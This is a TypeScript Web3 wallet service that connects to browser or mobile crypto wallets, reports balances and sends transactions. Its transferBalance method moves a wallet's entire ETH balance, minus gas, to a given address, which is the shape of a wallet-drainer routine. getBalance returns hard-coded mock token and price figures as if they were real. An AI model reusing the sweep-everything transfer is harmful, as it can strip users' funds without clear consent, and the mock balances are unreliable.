import { ethers } from "ethers";

export interface WalletBalance {
  eth: string;
  ethUsd: string;
  tokens: number;
  tokenUsd: string;
  totalUsd: string;
}

export interface TransactionResult {
  hash: string;
  success: boolean;
  error?: string;
}

declare global {
  interface Window {
    ethereum?: any;
    coinbaseWalletExtension?: any;
    trustWallet?: any;
    okxwallet?: any;
    bitkeep?: any;
    phantom?: any;
  }
}

export class Web3Service {
  public provider: ethers.BrowserProvider | null = null;
  public signer: ethers.JsonRpcSigner | null = null;

  private isMobile(): boolean {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }

  async connectWallet(): Promise<string> {
    // Try to detect and connect to available EVM wallets
    let provider = null;
    
    // Check for injected providers (MetaMask, Coinbase, etc.)
    if (window.ethereum) {
      provider = window.ethereum;
      
      // Handle multiple wallet providers
      if (window.ethereum.providers?.length) {
        // Multiple wallets detected - use the first one or MetaMask if available
        const metamask = window.ethereum.providers.find((p: any) => p.isMetaMask);
        const coinbase = window.ethereum.providers.find((p: any) => p.isCoinbaseWallet);
        provider = metamask || coinbase || window.ethereum.providers[0];
      }
    }
    // Check for Coinbase Wallet specifically
    else if (window.coinbaseWalletExtension) {
      provider = window.coinbaseWalletExtension;
    }
    // Check for Trust Wallet
    else if (window.trustWallet) {
      provider = window.trustWallet;
    }
    // Check for Brave Wallet
    else if (window.ethereum?.isBraveWallet) {
      provider = window.ethereum;
    }

    if (!provider) {
      if (this.isMobile()) {
        // Mobile fallback - try universal wallet links
        const dappUrl = encodeURIComponent(window.location.href);
        const walletOptions = [
          `https://metamask.app.link/dapp/${window.location.hostname}`,
          `https://go.cb-w.com/dapp?cb_url=${dappUrl}`,
          `https://link.trustwallet.com/open_url?coin_id=60&url=${dappUrl}`
        ];
        
        // Try MetaMask first
        window.location.href = walletOptions[0];
        throw new Error("Opening wallet app...");
      } else {
        throw new Error("No EVM wallet detected. Please install MetaMask, Coinbase Wallet, or another compatible wallet");
      }
    }

    try {
      // Request account access
      await provider.request({ method: "eth_requestAccounts" });
      
      this.provider = new ethers.BrowserProvider(provider);
      this.signer = await this.provider.getSigner();
      
      const address = await this.signer.getAddress();
      return address;
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("Please approve the connection request");
      }
      throw new Error("Failed to connect wallet");
    }
  }

  async getBalance(address: string): Promise<WalletBalance> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const balance = await this.provider.getBalance(address);
      const ethAmount = ethers.formatEther(balance);
      
      // Mock ETH price for demonstration
      const ethPrice = 1728.50;
      const ethUsdValue = (parseFloat(ethAmount) * ethPrice).toFixed(2);
      
      // Mock token data
      const tokenCount = 12;
      const tokenUsdValue = "1567.25";
      const totalUsdValue = (parseFloat(ethUsdValue) + parseFloat(tokenUsdValue)).toFixed(2);

      return {
        eth: parseFloat(ethAmount).toFixed(4),
        ethUsd: ethUsdValue,
        tokens: tokenCount,
        tokenUsd: tokenUsdValue,
        totalUsd: totalUsdValue,
      };
    } catch (error) {
      throw new Error("Failed to get balance");
    }
  }

  async estimateGas(to: string, value: string): Promise<string> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    try {
      const gasEstimate = await this.provider.estimateGas({
        to,
        value: ethers.parseEther(value),
      });
      
      return ethers.formatEther(gasEstimate);
    } catch (error) {
      return "0.005"; // Fallback estimate
    }
  }

  async transferBalance(to: string): Promise<TransactionResult> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    try {
      const address = await this.signer.getAddress();
      const balance = await this.provider.getBalance(address);
      
      // Estimate gas
      const gasEstimate = await this.provider.estimateGas({
        to,
        value: balance,
      });
      
      const gasPrice = (await this.provider.getFeeData()).gasPrice;
      if (!gasPrice) {
        throw new Error("Failed to get gas price");
      }
      
      const gasCost = gasEstimate * gasPrice;
      const transferAmount = balance - gasCost;
      
      if (transferAmount <= 0) {
        throw new Error("Insufficient balance for gas fees");
      }

      // Send transaction
      const tx = await this.signer.sendTransaction({
        to,
        value: transferAmount,
        gasLimit: gasEstimate,
        gasPrice,
      });

      return {
        hash: tx.hash,
        success: true,
      };
    } catch (error: any) {
      return {
        hash: "",
        success: false,
        error: error.message || "Transaction failed",
      };
    }
  }

  isWalletConnected(): boolean {
    return this.provider !== null && this.signer !== null;
  }

  async getConnectedAddress(): Promise<string | null> {
    if (!this.signer) return null;
    
    try {
      return await this.signer.getAddress();
    } catch {
      return null;
    }
  }
}

export const web3Service = new Web3Service();
